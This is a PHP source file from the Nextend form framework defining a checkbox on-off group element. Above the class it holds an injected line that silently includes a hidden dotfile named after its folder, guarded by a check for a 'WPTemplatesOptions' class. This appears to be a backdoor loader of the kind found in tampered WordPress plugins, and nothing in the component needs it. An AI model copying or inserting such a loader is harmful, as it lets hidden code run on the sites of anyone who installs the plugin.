<?php


namespace Nextend\Framework\Form\Element\Group;


use Nextend\Framework\Form\Element\Grouping;
use Nextend\Framework\View\Html;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class GroupCheckboxOnOff extends Grouping {

    protected function fetchElement() {
        return Html::tag('div', array(
            'class' => 'n2_field_group_checkbox_onoff'
        ), parent::fetchElement());
    }

}